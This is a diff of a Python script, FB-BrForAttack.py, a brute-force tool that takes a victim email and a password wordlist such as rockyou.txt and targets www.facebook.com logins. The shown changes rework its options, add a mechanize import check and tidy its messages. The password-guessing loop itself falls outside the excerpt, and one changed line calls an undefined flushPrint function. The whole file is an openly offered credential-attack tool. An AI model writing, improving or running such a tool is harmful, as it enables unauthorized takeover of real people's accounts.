@@ -1,33 +1,39 @@
 #!/usr/bin/python
-import mechanize,socket,time,os  
-from optparse import *  
+# -*- coding: utf-8 -*-
+
+#I Love Python(^-^)
+
+##-------- Import Libraries --------##
+import socket,time,os	            ##
+import optparse			    ##
+##----------------------------------##
 
 ################## check internet #################
-server = "www.google.com"			  #
-def check():					  #
-   try:						  #
-      s = socket.gethostbyname(server)		  #
-      ss = socket.create_connection((s, 80), 2)	  #
-      return True				  #
-   except:					  #
-	 pass					  #
-   return False					  #
-						  #
-check = check()					  #
+server = "www.google.com"                         #
+def check():                                      #
+   try:                                           #
+      s = socket.gethostbyname(server)            #
+      ss = socket.create_connection((s, 80), 2)   #
+      return True                                 #
+   except:                                        #
+         pass                                     #
+   return False                                   #
+                                                  #
+check = check()                                   #
 ###################################################
 
-parse = OptionParser("""\nUsage: FB-BrForAttack.py
+parse = optparse.OptionParser("""\nUsage:python ./FB-BrForAttack.py -F <Target Email> -W <Wordlist file>
 
--T <target email>
--W <word list file>
+OPTIONS:
+        -F <target email>        ::>   Set target Email
+        -W <word list file>      ::>   Set Wordlist File 
 
-example:
-
-./FB-BrForAttack.py -T victim@gmail.com -W /usr/share/wordlists/rockyou.txt
+Example:
+        ./FB-BrForAttack.py -F victim@gmail.com -W /usr/share/wordlists/rockyou.txt
 """)
 
 def Main():
-   parse.add_option("-T","--victim",dest="taremail",type="string",
+   parse.add_option("-F","--victim",dest="taremail",type="string",
 			help="target email !")
    parse.add_option("-W","--wordlist",dest="wlst",type="string",
 			help="wordlist file !")
@@ -35,17 +41,23 @@ def Main():
    if options.taremail !=None and options.wlst !=None: 
      user = options.taremail
      passw = options.wlst
+     try:
+	import mechanize
+     except:
+	   print("The [ mechanize lib ] is Not found!\n[*]Please run this command> [ pip install mechanize ]")
+	   exit()
+
      global check
      if check == True:
 	         try:
 		    passwfile = open(passw, "r")
 		 except:
-		       print("[> "+passw+" <] File Not Found !")
-		       exit()
+                        print("\n[> "+passw+" <] File Not Found !\n")
+                        exit()
 		 os.system("clear || cls")
 		 print("\n[*]website>: www.facebook.com ")
 		 time.sleep(1)
-		 print("\n[+]Target Email>: "+str(user))
+		 flushPrint("\n[+]Target Email>: "+str(user))
 		 time.sleep(1.2)
 		 print("\n[@]Wlist>: "+str(passw))
 		 time.sleep(1)
